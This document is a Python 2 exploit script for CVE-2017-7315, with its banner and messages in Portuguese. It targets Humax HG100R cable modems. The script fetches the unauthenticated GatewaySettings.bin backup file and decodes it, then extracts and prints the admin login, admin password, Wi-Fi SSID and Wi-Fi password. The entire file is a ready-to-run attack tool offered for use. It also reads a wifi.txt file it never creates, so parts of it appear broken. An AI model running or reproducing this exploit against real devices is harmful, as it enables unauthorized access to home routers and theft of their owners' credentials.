#!/usr/bin/python
# Exploit: CVE 2017-7315 (got by Gambler [br huehue])
# Date: 12 July 2017
# Exploit Script Author: Carlos Neri Correia
# Author Contact: hackerama@protonmail.com

import subprocess
import base64
import requests
import sys

def convert(gateway):
		exploit = '/view/basic/GatewaySettings.bin'
		if gateway.endswith('/'):
				gateway = gateway[:-1]
				
		if not gateway.startswith('http://'):
				url = 'http://'+ gateway+ exploit
				return url
		else:
				url = gateway + exploit
				return url

def encontre(word):
    arq = open('wifi.txt', 'r').readlines()
    for item in arq:
        if item.rfind(word) != -1:
            trato = item.strip(' ')
            if trato.startswith('"ssid" : "#'):
                continue
            else:
                return trato
                				
def usage():
	return """
USAGE:  python NETcrap.py [GATEWAY]
		
        Ex:
        python NETcrap.py http://192.168.0.1
        python NETcrap.py http://192.168.0.1/
        python NETcrap.py 192.168.0.1     
        python NETcrap.py 192.168.0.1/
"""
if len(sys.argv) > 1:
	if sys.argv[1] == '-h':
		print usage()
		sys.exit(0)

print """
+-----------------------------------------------------+
|           NETcrep - Exploit CVE 2017-7315           |
+-----------------------------------------------------+
                 facebook.com/hacker4ma

Download privilegiado de arquivo de backup e bypass dos 
modems Humax Digital HG100R 2.0.6 (modems padrao da NET) 
obtendo credenciais e outras informacoes sensiveis. 
"""
try:
	gateway = sys.argv[1]
	url = convert(gateway)
except:
	print usage()
	sys.exit(0)
try:	
	print '\n[NETcrap] - Baixando e decodificando arquivo de backup.'
	req = requests.get(url,timeout=15, stream=True)
	for chunk in req.iter_content(chunk_size=2048):
		if chunk:
			raw = req.content
	output = base64.b64decode(raw).decode('ascii','ignore').replace('^@','')
	open('saida.txt', 'w').write(output)
	
	extract = subprocess.Popen(["strings saida.txt | grep -A 1 admin"], shell=True,stdout=subprocess.PIPE).communicate()[0].split('\n')
	print '[NETcrap] - Credenciais de acesso encontradas.\n'
	print 'INFOS DO MODEM:'
	print '---------------'
	print 'Login: %s' % extract[0]
	print 'Senha: %s' % extract[1]
	print 'Modelo: ' + encontre('model_name') [16:-3]
	print 'Provedor: ' + encontre('vendor_name')[17:-2]+'\n'
	print 'INFOS DO WI-FI:'
	print '-------------- '
	print 'SSID: ' + encontre('"ssid"')[10:-3]
	print 'Password: ' + encontre('password')[14:-3]+'\n'
	print '[NETcrap] - Arquivo de backup salvo como saida.txt. '
	print '[NETcrap] - Outras informacoes interessantes foram salvas no arquivo wifi.txt.\n'
except:
	pass
